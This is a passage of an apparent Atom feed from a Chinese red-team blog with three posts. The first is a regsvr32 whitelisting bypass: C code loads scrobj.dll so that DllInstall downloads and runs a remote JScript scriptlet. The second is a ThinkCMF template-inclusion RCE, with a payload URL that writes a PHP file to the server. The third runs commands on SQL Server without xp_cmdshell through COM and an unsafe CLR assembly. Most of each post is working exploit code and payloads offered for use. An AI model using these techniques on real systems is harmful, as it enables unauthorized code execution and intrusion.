    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>regsvr32绕过</title>
    <link href="http://422926799.github.io/posts/b2680e3b.html"/>
    <id>http://422926799.github.io/posts/b2680e3b.html</id>
    <published>2021-01-19T17:46:02.000Z</published>
    <updated>2021-01-19T17:55:02.087Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波<br>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247486668&amp;idx=1&amp;sn=b490c44dd870307a574818fd2d56e4a3&amp;chksm=fb183ffecc6fb6e80f6ff64781325ebdfc8edc14462b2c6921213dcb72845dc243a2dc6f5176" target="_blank" rel="noopener">regsvr32绕过</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>regsvr32远程下载是调用scrobj.dll里的DllInstall函数实现的下载<br><img src="https://s3.ax1x.com/2021/01/20/sRKxoV.png" alt=""></p><p>IDA分析<br><img src="https://s3.ax1x.com/2021/01/20/sRMSiT.md.png" alt=""></p><p>API Monitor跟踪这个dll<br><img src="https://s3.ax1x.com/2021/01/20/sRM9WF.png" alt=""></p><p>搜索API关键名称CreateURLMonikerEx，找到函数位置<br><img src="https://s3.ax1x.com/2021/01/20/sRMiQJ.png" alt=""></p><p>搜索该函数调用点在sub_1800072D0，符合DllInstall函数调用<br><img src="https://s3.ax1x.com/2021/01/20/sRMZo6.png" alt=""></p><p>调用该函数实现regsvr32实现功能</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define error_print(name){printf(&quot;%s,Error Code:%d&quot;,GetLastError());exit(1);}int main(){        LPCSTR dllpath = &quot;c:\\windows\\system32\\scrobj.dll&quot;;        HMODULE load = LoadLibraryA(dllpath);        if (load == NULL) {               error_print(&quot;LoadLibraryA&quot;);        }        FARPROC getmodule = GetProcAddress(load, &quot;DllInstall&quot;);        if (getmodule == NULL) {               error_print(&quot;GetProcAddress&quot;);        }        ((void(*)(BOOL, TCHAR*))getmodule)(FALSE, L&quot;http://192.168.137.227/testx.txt&quot;); //指针函数调用    return 0;}</code></pre><p>testx.txt</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;&lt;component id=&quot;TESTING&quot;&gt;&lt;registration  progid=&quot;TESTING&quot;  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;  &lt;script language=&quot;JScript&quot;&gt;    &lt;![CDATA[      var wsc = &quot;WScript.Shell&quot;;      var com = &quot;calc&quot;;      com.concat(&quot;.&quot;,&quot;e&quot;,&quot;x&quot;,&quot;e&quot;);      var foo = new ActiveXObject(wsc).Run(com);    ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/component&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/20/sRMQQH.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波&lt;br&gt;参考链接</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>ThinkCMF任意包含漏洞复现</title>
    <link href="http://422926799.github.io/posts/3656eb8c.html"/>
    <id>http://422926799.github.io/posts/3656eb8c.html</id>
    <published>2021-01-09T07:34:49.000Z</published>
    <updated>2021-01-09T07:42:16.658Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞出在：application\Portal\Controller\IndexController.class.php<br>首先引用Common\Controller\HomebaseController控制类文件，然后调用display函数<br><img src="https://s3.ax1x.com/2021/01/09/sMq958.png" alt=""></p><p>跟入display函数看描述就是可以自定义加载模版，通过$this-&gt;parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。<br><img src="https://s3.ax1x.com/2021/01/09/sMqZbq.png" alt=""></p><pre><code class="php">public function parseTemplate($template=&#39;&#39;) {   $tmpl_path=C(&quot;SP_TMPL_PATH&quot;); // 前台模板文件根目录 themes/   define(&quot;SP_TMPL_PATH&quot;, $tmpl_path);   if($this-&gt;theme) { // 指定模板主题       $theme = $this-&gt;theme;   }else{       // 获取当前主题名称       $theme      =    C(&#39;SP_DEFAULT_THEME&#39;); // 前台模板文件 simplebootx       if(C(&#39;TMPL_DETECT_THEME&#39;)) {// 自动侦测模板主题           $t = C(&#39;VAR_TEMPLATE&#39;); //默认模板切换变量 t           if (isset($_GET[$t])){               $theme = $_GET[$t];           }elseif(cookie(&#39;think_template&#39;)){               $theme = cookie(&#39;think_template&#39;);           }           if(!file_exists($tmpl_path.&quot;/&quot;.$theme)){ //判断前台模板文件是否存在               $theme  =   C(&#39;SP_DEFAULT_THEME&#39;);           }           cookie(&#39;think_template&#39;,$theme,864000);       }   }   $theme_suffix=&quot;&quot;;   if(C(&#39;MOBILE_TPL_ENABLED&#39;) &amp;&amp; sp_is_mobile()){//开启手机模板支持       if (C(&#39;LANG_SWITCH_ON&#39;,null,false)){           if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile_&quot;.LANG_SET)){//优先级最高               $theme_suffix  =  &quot;_mobile_&quot;.LANG_SET;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){               $theme_suffix  =  &quot;_mobile&quot;;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_&quot;.LANG_SET)){               $theme_suffix  =  &quot;_&quot;.LANG_SET;           }       }else{              if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){                  $theme_suffix  =  &quot;_mobile&quot;;              }       }   }else{       $lang_suffix=&quot;_&quot;.LANG_SET;       if (C(&#39;LANG_SWITCH_ON&#39;,null,false) &amp;&amp; file_exists($tmpl_path.&quot;/&quot;.$theme.$lang_suffix)){           $theme_suffix = $lang_suffix;       }   }   $theme=$theme.$theme_suffix; //定义当前语言   C(&#39;SP_DEFAULT_THEME&#39;,$theme);   $current_tmpl_path=$tmpl_path.$theme.&quot;/&quot;;   // 获取当前主题的模版路径   define(&#39;THEME_PATH&#39;, $current_tmpl_path);   $cdn_settings=sp_get_option(&#39;cdn_settings&#39;);   if(!empty($cdn_settings[&#39;cdn_static_root&#39;])){       $cdn_static_root=rtrim($cdn_settings[&#39;cdn_static_root&#39;],&#39;/&#39;);       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,$cdn_static_root.&quot;/&quot;.$current_tmpl_path);       C(&quot;TMPL_PARSE_STRING.__PUBLIC__&quot;,$cdn_static_root.&quot;/public&quot;);       C(&quot;TMPL_PARSE_STRING.__WEB_ROOT__&quot;,$cdn_static_root);   }else{       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,__ROOT__.&quot;/&quot;.$current_tmpl_path);   }   C(&#39;SP_VIEW_PATH&#39;,$tmpl_path);   C(&#39;DEFAULT_THEME&#39;,$theme);   define(&quot;SP_CURRENT_THEME&quot;, $theme);   if(is_file($template)) {      return $template;   }   $depr       =   C(&#39;TMPL_FILE_DEPR&#39;);   $template   =   str_replace(&#39;:&#39;, $depr, $template);   // 获取当前模块   $module   =  MODULE_NAME;   if(strpos($template,&#39;@&#39;)){ // 跨模块调用模版文件      list($module,$template)  =   explode(&#39;@&#39;,$template);   }   $module =$module.&quot;/&quot;;   // 分析模板文件规则   if(&#39;&#39; == $template) {      // 如果模板文件名为空 按照默认规则定位      $template = CONTROLLER_NAME . $depr . ACTION_NAME;   }elseif(false === strpos($template, &#39;/&#39;)){      $template = CONTROLLER_NAME . $depr . $template;   }   $file = sp_add_template_file_suffix($current_tmpl_path.$module.$template);   $file= str_replace(&quot;//&quot;,&#39;/&#39;,$file);   if(!file_exists_case($file)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$file);   return $file;}</code></pre><p>由于parseTemplate函数为模板渲染函数，而该函数权限为public。导致可控，最终payload如下：<br>/?a=fetch&amp;templateFile=public/index&amp;prefix=’’&amp;content=<php>file_put_contents(‘test.php’,’&lt;?php phpinfo(); ?&gt;’)</php><br><img src="https://s3.ax1x.com/2021/01/09/sMqMPU.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/09/sMq8M9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/ch459742906/p/5949168.html" target="_blank" rel="noopener">https://www.cnblogs.com/ch459742906/p/5949168.html</a><br><a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw</a><br><a href="https://www.cnblogs.com/0daybug/p/11720575.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11720575.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h2&gt;&lt;p&gt;根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>sql server没xp_cmdshell执行命令</title>
    <link href="http://422926799.github.io/posts/639a5410.html"/>
    <id>http://422926799.github.io/posts/639a5410.html</id>
    <published>2021-01-07T00:32:40.000Z</published>
    <updated>2021-01-07T00:43:01.518Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用COM执行命令"><a href="#利用COM执行命令" class="headerlink" title="利用COM执行命令"></a>利用COM执行命令</h2><p>（需要开启Ole Automation Procedures组件）</p><pre><code>declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@luan output;exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe /c whoami&#39;;exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;exec sp_oamethod @text, &#39;readall&#39;, @str out;select @str;</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs3hd.png" alt=""></p><p>没有开启Ole Automation Procedures，可以用下面的命令开启</p><pre><code>sp_configure &#39;show advanced options&#39;, 1;GORECONFIGURE;GOsp_configure &#39;Ole Automation Procedures&#39;, 1;GORECONFIGURE;GO</code></pre><h2 id="编写CLR实现执行命令"><a href="#编写CLR实现执行命令" class="headerlink" title="编写CLR实现执行命令"></a>编写CLR实现执行命令</h2><p>编写语言：C#<br>Vs创建类库</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System;using System.Threading.Tasks;namespace shellexec{    public class exec    {        public static string cmd(string command)        {            System.Diagnostics.Process pro = new System.Diagnostics.Process();            pro.StartInfo.FileName = &quot;cmd.exe&quot;;            pro.StartInfo.UseShellExecute = false;            pro.StartInfo.RedirectStandardError = true; //标准错误            pro.StartInfo.RedirectStandardInput = true; //标准输入            pro.StartInfo.RedirectStandardOutput = true; //标准输出            pro.StartInfo.CreateNoWindow = true; //是否在新窗口开启进程            pro.Start();            pro.StandardInput.WriteLine(command + &quot;&amp;&amp;exit&quot;); //命令参数写入            pro.StandardInput.AutoFlush = true; //缓冲区自动刷新            string output = pro.StandardOutput.ReadToEnd(); //读取执行结果            pro.WaitForExit(); //等待执行完成退出            pro.Close();            return output.ToString();        }    }}</code></pre><p>生成dll后，可以用hex的方法写到目标，或者shell上传。然后开始构造<br>1.目标数据库实例需要启用clr集成</p><pre><code>exec sp_configure &#39;clr enabled&#39;, 1;--在SQL Server中启用CLRreconfigure;go</code></pre><p>2.目标数据库的可信任属性需要设为false,可以使用以下语句启用</p><pre><code>ALTER DATABASE [&lt;数据库名称&gt;] SET TRUSTWORTHY ON</code></pre><p>3.在数据库中注册DLL</p><pre><code>CREATE ASSEMBLY MySqlCLR FROM &#39;&lt;dll的路径&gt;&#39; //MySqlCLR为导入dll后的变量名称</code></pre><p>4.创建函数<br>（根据对应函数的类型的参数构造对应的参数类型，然后RETURNS [nvarchar] (max)记得设置为返回最大如果是返回string类型的话），在直接这个dll的名称在那个命名空间、类、函数）</p><pre><code>CREATE FUNCTION [dbo].[cmd2]  (      @cmd AS NVARCHAR(max))  RETURNS [nvarchar] (max) WITH EXECUTE AS CALLERAS  EXTERNAL NAME [MySqlCLR].[shellexec.exec].cmd //shellexec为命名空间，exec为类名，cmd为函数名GO</code></pre><p>5.程序集的权限级别必须设为 external access,否则在部署的时候会报错</p><pre><code>ALTER ASSEMBLY [MySqlCLR]WITH PERMISSION_SET = UNSAFE</code></pre><p>6.调用存储过程和函数方法</p><pre><code>select [dbo].[cmd2](&#39;whoami&#39;)</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs6cq.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/07/sZsWHU.png" alt=""></p><p>参考链接：<br><a href="https://blog.csdn.net/catchme_439/article/details/78411009" target="_blank" rel="noopener">https://blog.csdn.net/catchme_439/article/details/78411009</a><br><a href="https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用COM执行命令&quot;&gt;&lt;a href=&quot;#利用COM执行命令&quot; class=&quot;headerlink&quot; title=&quot;利用COM执行命令&quot;&gt;&lt;/a&gt;利用COM执行命令&lt;/h2&gt;&lt;p&gt;（需要开启Ole Automation Procedures组件）&lt;/p&gt;
&lt;pre</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
</feed>
